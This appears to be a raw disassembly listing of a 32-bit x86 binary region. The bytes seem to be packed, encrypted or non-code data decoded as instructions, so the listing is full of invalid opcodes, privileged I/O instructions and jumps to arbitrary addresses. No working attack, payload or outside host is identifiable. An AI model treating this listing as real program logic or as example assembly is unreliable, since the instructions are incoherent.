  4204a6:	xlat   BYTE PTR ds:[ebx]
  4204a7:	xor    eax,0xdd1e501e
  4204ac:	inc    edi
  4204ad:	jle    0x42051c
  4204af:	imul   ebx,ecx,0x27
  4204b2:	js     0x420473
  4204b4:	mov    edi,0x58001e5e
  4204b9:	mov    WORD PTR [edi+0x450aa031],cs
  4204bf:	loopne 0x420495
  4204c1:	pop    ss
  4204c2:	ins    BYTE PTR es:[edi],dx
  4204c3:	and    ebp,DWORD PTR [ebx-0x799163a0]
  4204c9:	pusha  
  4204ca:	mov    bl,BYTE PTR [eax+ebx*1-0x2c7a4697]
  4204d1:	mov    BYTE PTR [ebp+0x4a],al
  4204d4:	shl    BYTE PTR [ecx-0xaaf132a],0x4f
  4204db:	mov    ecx,0x9f86c93a
  4204e0:	xchg   ecx,eax
  4204e1:	adc    cl,BYTE PTR [edi+0x1aec5a99]
  4204e7:	push   0xfffffff0
  4204e9:	or     al,0x44
  4204eb:	pusha  
  4204ec:	fwait
  4204ed:	mov    edx,0x1d13bc6a
  4204f2:	fimul  WORD PTR [eax-0x54c0d97f]
  4204f8:	mov    eax,ds:0xe4561dae
  4204fd:	pop    ebx
  4204fe:	jp     0x420540
  420500:	push   0xffffff93
  420502:	pop    ds
  420503:	lods   eax,DWORD PTR ds:[esi]
  420504:	loopne 0x4204fe
  420506:	mov    bl,0x68
  420508:	mov    eax,ds:0xab9c3ecf
  42050d:	xchg   edx,eax
  42050e:	mov    bh,0xf
  420510:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420511:	jmp    0x42058d
  420513:	bound  ebx,QWORD PTR [edi+0x63bf4abe]
  420519:	push   eax
  42051a:	cmp    eax,esi
  42051c:	jo     0x4204d0
  42051e:	xor    cl,BYTE PTR ds:0x9888db9f
  420524:	cli    
  420525:	(bad)  
  420526:	sbb    esp,ecx
  420528:	pop    ds
  420529:	adc    al,0x6c
  42052b:	cmp    DWORD PTR [edx+esi*1],0x3e
  42052f:	into   
  420530:	inc    esi
  420531:	call   0xa4b8f1f3
  420536:	stos   BYTE PTR es:[edi],al
  420537:	icebp  
  420538:	sbb    DWORD PTR [edi+0x53e60ee0],eax
  42053e:	inc    ebx
  42053f:	out    0x32,al
  420541:	ins    DWORD PTR es:[edi],dx
  420542:	sbb    ch,BYTE PTR [edi-0x2c]
  420545:	jno    0x42052b
  420547:	mov    cl,0x7d
  420549:	(bad)  
  42054a:	mov    edx,0x931b06e9
  42054f:	stos   DWORD PTR es:[edi],eax
  420550:	pop    ebp
  420551:	pusha  
  420552:	repz (bad) 
  420554:	xchg   edi,eax
  420555:	sti    
  420556:	mov    ds:0xfd181d7f,al
  42055b:	fnstenv [esi+ebx*2+0x2f238b37]
  420562:	mov    al,0xa1
  420564:	daa    
  420565:	jecxz  0x420516
  420567:	fs push esi
  420569:	mov    bl,0x33
  42056c:	pop    esp
  42056d:	add    eax,0x34c3961e
  420572:	sbb    dh,bl
  420574:	add    ecx,esi
  420576:	stos   BYTE PTR es:[edi],al
  420577:	cmp    ebp,DWORD PTR ss:[esi+0x73b1c2bb]
  42057e:	mov    eax,0xc2f7bdda
  420583:	test   al,0x6b
  420585:	mov    esp,DWORD PTR [esi+0x5635431d]
  42058b:	or     bl,BYTE PTR [edi+0x6]
  42058e:	and    eax,0x30631f06
  420593:	jnp    0x4205d6
  420595:	add    ah,BYTE PTR [ebp+0x76be240e]
  42059b:	in     al,0x6d
  42059d:	xor    al,0x67
  42059f:	and    BYTE PTR ds:0xd44464d7,cl
  4205a5:	pop    ds
  4205a6:	nop
  4205a7:	mov    ds:0x57c1b0a0,eax
  4205ac:	out    dx,eax
  4205ad:	int    0x52
  4205af:	jb     0x42062e
  4205b1:	inc    esi
  4205b2:	cmp    BYTE PTR [esi+0x76],0x72
  4205b6:	mov    dl,0x9b
  4205b8:	inc    esp
  4205b9:	xchg   DWORD PTR [ecx+0x7b],ebx
  4205bc:	lds    eax,FWORD PTR [esi+edi*1]
  4205bf:	mov    dl,0xa8
  4205c1:	mov    DWORD PTR [eax-0x197fea46],esp
  4205c7:	cmp    al,0x78
  4205c9:	loop   0x4205a3
  4205cb:	sbb    al,0xf1
  4205cd:	iret   
  4205ce:	leave  
  4205cf:	or     DWORD PTR [eax],esi
  4205d1:	fadd   st,st(6)
  4205d3:	xor    ebp,DWORD PTR [edi-0x2d]
  4205d6:	or     al,0xef
  4205d8:	xchg   esi,eax
  4205d9:	and    eax,0xb2228a25
  4205de:	cmp    DWORD PTR [esi],0xeb040351
  4205e4:	mov    ebx,0x40fa336a
  4205e9:	(bad)  
  4205ea:	mov    ah,0x66
  4205ec:	test   eax,0x5044539
  4205f1:	pusha  
  4205f2:	les    esp,FWORD PTR [ecx]
  4205f4:	sub    al,0xd5
  4205f6:	outs   dx,DWORD PTR ds:[esi]
  4205f7:	lock shr cl,1
  4205fa:	push   es
  4205fb:	iret   
  4205fc:	stos   BYTE PTR es:[edi],al
  4205fd:	hlt    
  4205fe:	inc    ecx
  4205ff:	mov    eax,0x8f06d71a
  420604:	loopne 0x420629
  420606:	inc    edx
  420607:	cdq    
  420608:	jmp    0xb246:0x1ad48cf6
  42060f:	cs call 0x43ce4969
  420615:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420616:	and    DWORD PTR [edx],ebp
  420618:	fsubr  DWORD PTR [ebx-0x36f3ecaf]
  42061e:	lea    ebx,[ebx]
  420620:	and    ch,BYTE PTR ds:0xa0644a2c
  420626:	sbb    al,0x69
  420628:	iret   
  420629:	cwde   
  42062a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42062b:	xchg   ecx,eax
  42062c:	and    dh,0x32
  42062f:	cmp    BYTE PTR [ecx-0x74],bl
  420632:	mov    ds:0xd81ff77b,al
  420637:	or     ecx,DWORD PTR [edx]
  420639:	mov    esi,0xef22548
  42063e:	int    0x59
  420640:	jb     0x42060c
  420642:	shr    DWORD PTR [esi+0x14f4ff5],0xeb
  420649:	fcomip st,st(4)
  42064b:	and    cl,ch
  42064d:	test   DWORD PTR [eax],ebx
  42064f:	fld    QWORD PTR [eax+0x3ba0cca8]
  420655:	retf   
  420656:	mov    ds:0x3f2e10fd,al
  42065b:	and    eax,0x307cd57a
  420660:	or     esi,DWORD PTR [ebx]
  420662:	pop    ebx
  420663:	mov    dl,BYTE PTR [edx-0x3]
  420666:	or     BYTE PTR [edi],0xb
  420669:	mov    dh,BYTE PTR [eax+esi*8-0x55]
  42066d:	pop    ebx
  42066e:	setp   ah
  420671:	addr16 mov esi,0x6ac24038
  420677:	add    edx,DWORD PTR [ebp+0x38]
  42067a:	int    0xd6
  42067c:	fwait
  42067d:	imul   esi,DWORD PTR [ebx],0x92114464
  420683:	xacquire xchg BYTE PTR [edi-0x43],bl
  420687:	inc    ebx
  420688:	sub    BYTE PTR [edi-0x11],bh
  42068b:	jns    0x420644
  42068d:	jle    0x4206d5
  42068f:	jno    0x42061d
  420691:	sbb    al,BYTE PTR [esi+0x674aca90]
  420697:	mov    ebp,0x2deba4eb
  42069c:	or     eax,0x5e3909a6
  4206a1:	or     eax,0x8b27ba9e
  4206a6:	arpl   WORD PTR [edi],ax
  4206a8:	gs jae 0x42071e
  4206ab:	add    edx,DWORD PTR [ebp+0x3b]
  4206ae:	fcmovu st,st(0)
  4206b0:	or     DWORD PTR [esi+edi*2-0x3adc90b2],eax
  4206b7:	ret    
  4206b8:	repz mov dh,0x9e
  4206bb:	pop    edx
  4206bc:	imul   esi,ebp,0x79
  4206bf:	cld    
  4206c0:	pop    DWORD PTR [eax+0xa]
  4206c3:	lea    esp,[ebx+0x5ad64f10]
  4206c9:	push   ds
  4206ca:	out    dx,al
  4206cb:	js     0x420726
  4206cd:	adc    eax,0xb1968d30
  4206d2:	jg     0x4206a4
  4206d4:	cmp    al,0x72
  4206d6:	sbb    dh,dh
  4206d8:	jecxz  0x42071c
  4206da:	jb     0x420667
  4206dc:	scas   eax,DWORD PTR es:[edi]
  4206dd:	xchg   ebx,eax
  4206de:	pop    esp
  4206df:	fcomp  DWORD PTR [edx+0x69]
  4206e2:	sub    eax,esi
  4206e4:	xor    ax,0xf0d8
  4206e8:	jo     0x420726
  4206ea:	inc    ecx
  4206eb:	ret    0x8719
  4206ee:	xlat   BYTE PTR ds:[ebx]
  4206ef:	outs   dx,DWORD PTR ds:[esi]
  4206f0:	fsubr  QWORD PTR ds:0x4109de5b
  4206f6:	sbb    bh,BYTE PTR [ecx-0x3706bfb1]
  4206fc:	push   0xc907e3c7
  420701:	push   esp
  420702:	inc    esi
  420703:	arpl   WORD PTR [ebp-0xe],bp
  420706:	cld    
  420707:	pop    eax
  420708:	add    ah,ah
  42070a:	xchg   edi,edi
  42070c:	loopne 0x420704
  42070e:	inc    BYTE PTR ds:0x128e8ec8
  420714:	arpl   WORD PTR [edi+0x2bbb1cbb],bp
  42071a:	rcr    BYTE PTR [esi],0xf4
  42071d:	cmp    eax,0x1a4bd62f
  420722:	jecxz  0x420705
  420724:	sub    dh,BYTE PTR [ecx*1-0x7ef84369]
  42072b:	aas    
  42072c:	mov    edi,0x3056414f
  420731:	pop    ds
  420732:	pusha  
  420733:	pop    edx
  420734:	sbb    ebp,eax
  420736:	push   0x68743ab6
  42073b:	iret   
  42073c:	pop    ecx
  42073d:	or     eax,0x5c9ce807
  420742:	jge    0x4207a0
  420744:	rcl    BYTE PTR [edx+edx*2-0x5baf6c2],0x6d
  42074c:	cmp    bh,BYTE PTR [esp+eiz*8+0x52]
  420750:	aaa    
  420751:	sbb    al,0x3
  420753:	or     BYTE PTR [ecx+0x55],ah
  420756:	push   esi
  420757:	xchg   esp,eax
  420758:	adc    ebp,esp
  42075a:	mov    eax,ds:0x2532dfe1
  42075f:	cwde   
  420760:	pop    ebx
  420761:	scas   al,BYTE PTR es:[edi]
  420762:	jmp    0x420773
  420764:	and    esi,edi
  420766:	and    DWORD PTR [edx],esp
  420768:	aaa    
  420769:	xor    eax,0x91471867
  42076e:	in     eax,0xc3
  420770:	jnp    0x420723
  420772:	pushf  
  420773:	mov    BYTE PTR [ebx-0x31],ch
  420776:	or     cl,al
  420778:	adc    DWORD PTR [esi],0xec31bb0b
  42077e:	sahf   
  42077f:	jmp    0xdad33b97
  420784:	jno    0x4207d4
  420786:	fwait
  420787:	mov    ebp,esi
  420789:	scas   eax,DWORD PTR es:[edi]
  42078a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42078b:	mov    ds:0xe6128991,al
  420790:	cmp    BYTE PTR [edi+0xe],0x23
  420794:	leave  
  420795:	leave  
  420796:	xchg   ecx,eax
  420797:	rep outs dx,BYTE PTR ds:[esi]
  420799:	dec    esp
  42079a:	repz sub BYTE PTR [eax],bl
  42079d:	inc    ebp
  42079e:	dec    ebp
  42079f:	(bad)  
  4207a0:	fnstcw WORD PTR ds:0x2e993ec5
  4207a6:	jbe    0x42075c
  4207a8:	xchg   ebp,eax
  4207a9:	mov    dh,0x51
  4207ab:	ins    BYTE PTR es:[edi],dx
  4207ac:	xchg   edx,eax
  4207ad:	pop    esp
  4207ae:	aad    0xb0
  4207b0:	mov    ds:0x2f105f70,al
  4207b5:	rcr    al,cl
  4207b7:	bound  ebp,QWORD PTR ds:0xa6040587
  4207bd:	cmp    eax,0x3fd9ed7d
  4207c2:	dec    esi
  4207c3:	push   ecx
  4207c4:	popf   
  4207c5:	push   ecx
  4207c6:	or     esi,ecx
  4207c8:	sub    eax,0x584bc84
  4207cd:	outs   dx,BYTE PTR ds:[esi]
  4207ce:	dec    eax
  4207cf:	jnp    0x42083e
  4207d1:	fld    QWORD PTR [eax-0x6]
  4207d4:	mov    dl,0x37
  4207d6:	(bad)  
  4207d7:	fcomp  st(2)
  4207d9:	sahf   
  4207da:	aaa    
  4207db:	retf   0x40f5
  4207de:	or     eax,0xb66ed3d4
  4207e3:	pop    esp
  4207e4:	(bad)  
  4207e5:	pop    esp
  4207e6:	add    al,0xd1
  4207e8:	jmp    0x56a4:0xa5b86333
  4207ef:	aad    0xa9
  4207f1:	cwde   
  4207f2:	jo     0x42084f
  4207f4:	(bad)  
  4207f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4207f6:	not    DWORD PTR [esi+esi*4-0x53]
  4207fa:	and    eax,0x735b3e45
  4207ff:	das    
  420800:	imul   esi,DWORD PTR ds:0x32cc5707,0x6b
  420807:	pop    ss
  420808:	scas   eax,DWORD PTR es:[edi]
  420809:	fbstp  TBYTE PTR [esi]
  42080b:	jo     0x420882
  42080d:	ins    BYTE PTR es:[edi],dx
  42080e:	sub    eax,0x723a7b83
  420813:	mov    dh,0xe
  420815:	xlat   BYTE PTR ds:[ebx]
  420816:	lock mov ds:0x86552c4f,al
  42081c:	imul   ecx,DWORD PTR [eax-0x7accea41],0xffffffad
  420823:	mov    ds:0x577bbe45,eax
  420828:	leave  
  420829:	fwait
  42082a:	push   edx
  42082b:	mov    ds:0x198329e,al
  420830:	jecxz  0x420816
  420832:	jp     0x420833
  420834:	icebp  
  420835:	inc    ecx
  420836:	cmp    al,0xd3
  420838:	jmp    0x5a5a:0x34b7969e
  42083f:	mov    bl,0x63
  420841:	repz or BYTE PTR [ecx],dl
  420844:	pop    esi
  420845:	(bad)  
  420846:	fmul   DWORD PTR [eax]
  420848:	aas    
  420849:	mov    eax,ds:0x4032cc0a
  42084e:	icebp  
  42084f:	(bad)  
  420850:	jmp    0x420881
  420852:	jmp    0x4208ce
  420854:	mov    cl,0x1d
  420856:	icebp  
  420857:	pop    edi
  420858:	enter  0x77cb,0xa1
  42085c:	dec    edx
  42085d:	mov    eax,0xce800482
  420862:	ins    DWORD PTR es:[edi],dx
  420863:	das    
  420864:	sti    
  420865:	mov    al,0x45
  420867:	arpl   WORD PTR [edi],dx
  420869:	(bad)  
  42086a:	jbe    0x4208a3
  42086c:	sahf   
  42086d:	inc    eax
  42086e:	ins    DWORD PTR es:[edi],dx
  42086f:	jl     0x4208d9
  420871:	leave  
  420872:	int3   
  420873:	add    DWORD PTR [ebp+0x6661cc0c],ebp
  420879:	adc    DWORD PTR [ebx-0x5dd0127d],eax
  42087f:	and    DWORD PTR [edx],eax
  420881:	imul   edx,DWORD PTR [edx-0x6dc7a0a2],0xdb3139a6
  42088b:	push   ss
  42088c:	shl    DWORD PTR [eax-0x6f],0x5b
  420890:	push   ss
  420891:	lock js 0x4208d5
  420894:	cld    
  420895:	push   esp
  420896:	lds    esp,FWORD PTR [ecx+esi*2+0x10]
  42089a:	(bad)  
  42089b:	in     eax,dx
  42089c:	sti    
  42089d:	jmp    0x213b:0x2264f5b6
  4208a4:	lods   al,BYTE PTR ds:[esi]
  4208a5:	iret   
  4208a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4208a7:	push   eax
  4208a8:	cmp    eax,0x1113391
  4208ad:	mov    DWORD PTR [edx],ecx
  4208af:	add    eax,0xfdab95da
  4208b4:	dec    DWORD PTR [edx+0x56153f0c]
  4208ba:	dec    BYTE PTR [edi]
  4208bc:	repz lock (bad) 
  4208bf:	or     ebx,DWORD PTR [ebp+0xf2cf5be]
  4208c5:	xor    BYTE PTR [edx],0x7a
  4208c8:	mov    cl,BYTE PTR [ecx]
  4208ca:	inc    esp
  4208cb:	hlt    
  4208cc:	ficomp WORD PTR [esi-0x56]
  4208cf:	rcl    DWORD PTR [esi],1
  4208d1:	(bad)  
  4208d3:	or     eax,0x892f0602
  4208d8:	(bad)  [eax+ebp*8]
  4208db:	int3   
  4208dc:	fcom   DWORD PTR [esi+0x34b3a925]
  4208e2:	js     0x4208c2
  4208e4:	xchg   BYTE PTR [eax+0x7d306806],dh
  4208ea:	xchg   ecx,eax
  4208eb:	lea    ecx,[ebx-0xe74a904]
  4208f1:	mov    BYTE PTR [edi-0x60],cl
  4208f4:	xor    eax,0x620e1ea
  4208f9:	push   es
  4208fa:	ds test al,0xe1
  4208fd:	sbb    bh,dl
  4208ff:	mov    ebp,0xd7fbf00f
  420904:	mov    edi,0xbf95909c
  420909:	mov    bl,0x63
  42090b:	jmp    0xfa75b265
  420910:	cdq    
  420911:	add    DWORD PTR [ecx-0x2a],ebx
  420914:	mov    edx,0xc516182e
  420919:	jb     0x420934
  42091b:	cli    
  42091c:	adc    edx,DWORD PTR [edx+0x67]
  42091f:	(bad)  
  420920:	sbb    eax,0x1a6ec786
  420925:	ficomp DWORD PTR [esi-0x39]
  420928:	and    bh,BYTE PTR [eax]
  42092a:	adc    al,0x2d
  42092c:	clc    
  42092d:	xor    al,0x93
  42092f:	push   esp
  420930:	ss iret 
  420932:	xor    DWORD PTR [ebx+0x12],ecx
  420935:	lods   eax,DWORD PTR ds:[esi]
  420936:	mov    cl,0xde
  420938:	mov    ds:0x7ae02d1d,al
  42093d:	push   es
  42093e:	es loop 0x420970
  420941:	sub    al,0xbe
  420943:	mov    ds:0xe2a9dd3a,al
  420948:	lahf   
  420949:	add    DWORD PTR [ebx-0x57a46fa7],ecx
  42094f:	push   cs
  420950:	test   DWORD PTR [edx-0x6330d7cd],ebp
  420956:	jle    0x420969
  420958:	js     0x420911
  42095a:	sub    ebx,DWORD PTR [edi-0x3b38c31b]
  420960:	(bad)  
  420961:	jmp    0xfa80:0x805b3dab
  420968:	mov    eax,es
  42096a:	std    
  42096b:	data16 sbb BYTE PTR [esi-0x7811b709],0xe
  420973:	jmp    esp
  420975:	fidiv  DWORD PTR [ebx+0x7327aab3]
  42097b:	sbb    al,0xac
  42097d:	push   ecx
  42097e:	and    al,0x4e
  420980:	jl     0x4209ec
  420982:	mov    bl,0x37
  420984:	addr16 into 
  420986:	dec    ecx
  420987:	shr    DWORD PTR [esi],1
  420989:	push   0x7e0389c2
  42098e:	stos   BYTE PTR es:[edi],al
  42098f:	xchg   bh,al
  420991:	in     eax,0x97
  420993:	fld    QWORD PTR ds:0xcfc88af8
  420999:	jg     0x420980
  42099b:	mov    cl,0xa1
  42099d:	leave  
  42099e:	mov    dl,0xf2
  4209a0:	jno    0x4209ec
  4209a2:	test   al,0x10
  4209a4:	repz pop es
  4209a6:	add    BYTE PTR [ecx-0x47],0xa2
  4209aa:	call   0xd4db4fea
  4209af:	xchg   BYTE PTR ds:0xa3683769,al
  4209b5:	je     0x420970
  4209b7:	pop    edi
  4209b8:	mov    bl,0x53
  4209ba:	fcomp  DWORD PTR [edi+edi*2]
  4209bd:	inc    ecx
  4209be:	enter  0x988e,0x26
  4209c2:	(bad)  
  4209c3:	sbb    al,BYTE PTR [edx+0x1749e94b]
  4209c9:	push   ss
  4209ca:	sahf   
  4209cb:	push   eax
  4209cc:	div    eax
  4209ce:	cld    
  4209cf:	jl     0x420a37
  4209d1:	cdq    
  4209d2:	out    0x97,al
  4209d4:	std    
  4209d5:	sbb    BYTE PTR fs:[esi-0x1b23b01c],ah
  4209dc:	sub    eax,DWORD PTR [edx+0x1250d131]
  4209e2:	repz mov WORD PTR [ebx],fs
  4209e5:	shr    esi,1
  4209e7:	dec    edi
  4209e8:	add    ah,bh
  4209ea:	sub    dl,BYTE PTR [esi-0x21975596]
  4209f0:	jns    0x420980
  4209f2:	fcom   QWORD PTR [edx-0x58aebcf2]
  4209f8:	std    
  4209f9:	je     0x4209c1
  4209fb:	(bad)  
  4209fd:	push   edx
  4209fe:	cmp    BYTE PTR [edx+0x10],bl
  420a01:	ins    BYTE PTR es:[edi],dx
  420a02:	in     al,0x46
  420a04:	rcr    BYTE PTR [ebx+0x48],1
  420a07:	sbb    al,0x39
  420a09:	ror    DWORD PTR ds:0xfe725ea,0xb8
  420a10:	dec    esp
  420a11:	add    edi,0xf49a0c15
  420a17:	sbb    al,0xab
  420a19:	cld    
  420a1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a1b:	add    eax,0xfdc95919
  420a20:	push   esp
  420a21:	ins    DWORD PTR es:[edi],dx
  420a22:	xchg   ebx,eax
  420a23:	in     eax,0x5c
  420a25:	push   ebx
  420a26:	xchg   DWORD PTR ds:0x6f191b2e,ecx
  420a2c:	add    edx,esi
  420a2e:	push   cs
  420a2f:	imul   edi,DWORD PTR [edi+0x733cd2df],0x4d
  420a36:	mov    esp,0x32af5267
  420a3b:	or     al,0x4d
  420a3d:	xchg   ebx,eax
  420a3e:	push   eax
  420a3f:	and    DWORD PTR [eax+0x3ddffdaf],0xf785f0a0
  420a49:	int3   
  420a4a:	shr    cl,0x81
  420a4d:	push   ebp
  420a4e:	stc    
  420a4f:	cmc    
  420a50:	mov    DWORD PTR [ecx-0x72],ebp
  420a53:	xor    BYTE PTR [ebp-0x27],bl
  420a56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a57:	inc    ebp
  420a58:	es inc eax
  420a5a:	ret    
  420a5b:	lock or ecx,DWORD PTR [eax+0x95f7523]
  420a62:	inc    ecx
  420a63:	lods   eax,DWORD PTR ds:[esi]
  420a64:	mov    dh,0x46
  420a66:	imul   esi,DWORD PTR [ebp-0x3c],0x16
  420a6a:	inc    ebp
  420a6b:	pop    ebp
  420a6c:	mov    bh,0xc3
  420a6e:	cmp    al,0x50
  420a70:	push   DWORD PTR [edi-0x21]
  420a73:	inc    ebx
  420a74:	aad    0x56
  420a76:	fistp  QWORD PTR [ebx]
  420a78:	lods   al,BYTE PTR ds:[esi]
  420a79:	jns    0x420aed
  420a7b:	fstp   QWORD PTR gs:[edx+0x33]
  420a7f:	imul   ebp,DWORD PTR [eax-0x15],0xfffffff8
  420a83:	push   ebp
  420a84:	inc    edx
  420a85:	push   0xffffff90
  420a87:	gs das 
  420a89:	xor    DWORD PTR [ecx-0x351dabbb],edi
  420a8f:	mov    esp,DWORD PTR [edx-0x1813255a]
  420a95:	dec    esi
  420a96:	das    
  420a97:	mov    dh,0xe4
  420a99:	push   esi
  420a9a:	mov    ebp,0xa13d6ee5
  420a9f:	test   DWORD PTR [ebp-0x35108444],edx
  420aa5:	dec    ecx
  420aa6:	adc    al,0xd0
  420aa8:	xor    eax,DWORD PTR [edx+0x286e6ad2]
  420aae:	ror    DWORD PTR [ebp+0x34],1
  420ab1:	pusha  
  420ab2:	pop    ebx
  420ab3:	ja     0x420a4a
  420ab5:	sbb    DWORD PTR [edi],ebp
  420ab7:	xchg   DWORD PTR [edx],ebx
  420ab9:	fidiv  DWORD PTR ds:0xaae400bb
  420abf:	fwait
  420ac0:	and    al,BYTE PTR [edi-0x3b]
  420ac3:	in     al,0x8c
  420ac5:	xchg   ebp,eax
  420ac6:	nop
  420ac7:	push   ecx
  420ac8:	sahf   
  420ac9:	rcr    BYTE PTR [ecx-0x5af1232d],cl
  420acf:	jns    0x420b3b
  420ad1:	jae    0x420ae2
  420ad3:	adc    BYTE PTR ds:0x5101d8d2,0x92
  420ada:	fsubr  DWORD PTR [ecx-0x42fbe222]
  420ae0:	cdq    
  420ae1:	mov    esp,0xf206d14f
  420ae6:	(bad)  
  420ae7:	out    dx,al
  420ae8:	pop    ds
  420ae9:	sub    DWORD PTR ds:0x4ecf0a08,edx
  420aef:	icebp  
  420af0:	shr    BYTE PTR [esi-0x62],cl
  420af3:	rcl    BYTE PTR [edi],0x17
  420af6:	sbb    BYTE PTR [ebp-0x13257cad],al
  420afc:	mov    edi,0x572b1515
  420b01:	mov    ebp,ebp
  420b03:	and    al,BYTE PTR [eax-0x22]
  420b06:	mov    cl,0x91
  420b08:	jge    0x420abf
  420b0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b0b:	push   DWORD PTR [eax]
  420b0d:	mov    DWORD PTR [esi+0x483bd6bd],edi
  420b13:	dec    esi
  420b14:	inc    BYTE PTR [ecx-0x7bb41b1b]
  420b1a:	add    ebx,edx
  420b1c:	das    
  420b1d:	dec    ebx
  420b1e:	fadd   st(2),st
  420b20:	mov    ebx,0xaebeb972
  420b25:	lods   eax,DWORD PTR ds:[esi]
  420b26:	mov    edx,0xf826d4b9
  420b2b:	add    BYTE PTR [edx],bh
  420b2d:	push   0x5c08293f
  420b32:	imul   BYTE PTR [edi+0x4a95e056]
  420b38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b39:	data16 cmc 
  420b3b:	into   
  420b3c:	mov    ds:0x7e3f1d95,eax
  420b41:	xor    esp,DWORD PTR [eax+0x598bcba9]
  420b47:	(bad)  
  420b48:	cs cmp al,0x2e
  420b4b:	pop    esp
  420b4c:	aad    0xe6
  420b4e:	mov    ?,WORD PTR [ebx]
  420b50:	xor    bh,al
  420b52:	adc    ebp,DWORD PTR [eax-0x19]
  420b55:	(bad)  
  420b56:	scas   eax,DWORD PTR es:[edi]
  420b57:	xor    BYTE PTR [ebx+0x3d83716d],0x76
  420b5e:	call   0x7c6e:0x9f04e64e
  420b65:	cld    
  420b66:	jge    0x420b11
  420b68:	retf   
  420b69:	jge    0x420b33
  420b6b:	(bad)  
  420b6c:	pusha  
  420b6d:	or     al,0x6c
  420b6f:	jnp    0x420ba5
  420b71:	cdq    
  420b72:	sahf   
  420b73:	ds into 
  420b75:	xlat   BYTE PTR ds:[ebx]
  420b76:	or     DWORD PTR [edx-0x60],ebp
  420b79:	call   0xec:0xa21104f7
  420b80:	mov    dh,0xf2
  420b82:	aaa    
  420b83:	or     eax,0x105cd102
  420b88:	and    eax,0x21b9a602
  420b8d:	push   0x29
  420b8f:	adc    ah,ch
  420b91:	push   ebp
  420b92:	fcom   QWORD PTR ds:0xac6aa94d
  420b98:	sub    al,0x8c
  420b9a:	pop    es
  420b9b:	inc    edi
  420b9c:	je     0x420b6b
  420b9e:	push   esp
  420b9f:	inc    ecx
  420ba0:	inc    edx
  420ba1:	adc    DWORD PTR ds:0xe658d719,0xa1bc0a15
  420bab:	jae    0x420c00
  420bad:	test   eax,0xf21ee1f3
  420bb2:	xchg   edx,eax
  420bb3:	stos   BYTE PTR es:[edi],al
  420bb4:	loop   0x420bf4
  420bb6:	aas    
  420bb7:	retf   
  420bb8:	push   ebp
  420bb9:	imul   edi,DWORD PTR [eax+0x4e],0x45
  420bbd:	retf   
  420bbe:	mov    edx,0xd6035c64
  420bc3:	mul    dl
  420bc5:	dec    edx
  420bc6:	popa   
  420bc7:	inc    ebp
  420bc8:	or     BYTE PTR [edx+0x5],dl
  420bcb:	fwait
  420bcc:	loopne 0x420c33
  420bce:	je     0x420bf9
  420bd0:	mov    esi,0xb2eab1a
  420bd5:	adc    BYTE PTR [edi+0x84bb77e],bl
  420bdb:	sbb    DWORD PTR ds:0xa24a1d3,edx
  420be1:	dec    eax
  420be2:	shr    DWORD PTR [ecx-0x713f696c],0x12
  420be9:	mov    ebx,0x3dfb4b60
  420bee:	pop    es
  420bef:	imul   eax,DWORD PTR [esi],0xffffff97
  420bf2:	scas   eax,DWORD PTR es:[edi]
  420bf3:	sub    bh,BYTE PTR [edx]
  420bf5:	addr16 push ds
  420bf7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420bf8:	sbb    dl,BYTE PTR [edx+0x2d]
  420bfb:	push   ebx
  420bfc:	xor    al,0x6
  420bfe:	ja     0x420c37
  420c00:	jnp    0x420c15
  420c02:	dec    ebp
  420c03:	pop    esi
  420c04:	lds    ecx,FWORD PTR [ebx-0x54]
  420c07:	push   esi
  420c08:	ja     0x420bff
  420c0a:	inc    ebx
  420c0b:	jl     0x420c44
  420c0d:	sar    BYTE PTR [ebx],cl
  420c0f:	lds    esp,FWORD PTR [ebp-0x47]
  420c12:	out    0x39,eax
  420c14:	adc    eax,0xa4d7a8c4
  420c19:	jo     0x420bd4
  420c1b:	adc    esp,0x9c8c8178
  420c21:	cwde   
  420c22:	sbb    eax,0x286b06ae
  420c27:	repnz push eax
  420c29:	(bad)  
  420c2b:	in     eax,0x49
  420c2d:	push   ds
  420c2e:	mov    al,0x4e
  420c30:	mov    ds:0xeaacd70d,eax
  420c35:	dec    ecx
  420c36:	loope  0x420bf4
  420c38:	xchg   esi,eax
  420c39:	mov    dl,0xe3
  420c3b:	retf   0xef97
  420c3e:	out    dx,eax
  420c3f:	jecxz  0x420c81
  420c41:	cmc    
  420c42:	(bad)  
  420c43:	fst    QWORD PTR [ebx+esi*4-0x5fd56d71]
  420c4a:	jg     0x420c7d
  420c4c:	and    ebx,ecx
  420c4e:	fist   DWORD PTR [ecx]
  420c50:	ds jnp 0x420c95
  420c53:	mov    esp,0x2ecc2545
  420c58:	sbb    si,dx
  420c5b:	mov    bh,0x86
  420c5d:	xchg   ebx,eax
  420c5e:	or     DWORD PTR [ebx],ebx
  420c60:	nop
  420c61:	mov    ss,WORD PTR [esi-0x1f550a6c]
  420c67:	adc    al,0x25
  420c69:	add    ebp,DWORD PTR [esi-0x7adc59c9]
  420c6f:	adc    eax,0xf3a14809
  420c74:	nop
  420c75:	les    edx,FWORD PTR [edx+0x56]
  420c78:	pop    edx
  420c79:	push   eax
  420c7a:	ss push ebx
  420c7c:	daa    
  420c7d:	mov    dl,0xf
  420c7f:	clc    
  420c80:	ins    DWORD PTR es:[edi],dx
  420c81:	mov    bl,0x43
  420c83:	cwde   
  420c84:	aam    0xb2
  420c86:	jbe    0x420c49
  420c88:	cmp    dh,dl
  420c8a:	and    ebx,DWORD PTR [esi]
  420c8c:	cmp    ch,BYTE PTR [ecx+0x13]
  420c8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c91:	sub    ebx,DWORD PTR [edx]
  420c93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c95:	xor    eax,0xfd6bbb86
  420c9a:	adc    edx,DWORD PTR [edi]
  420c9c:	ja     0x420c29
  420c9e:	pop    ebx
  420c9f:	push   cs
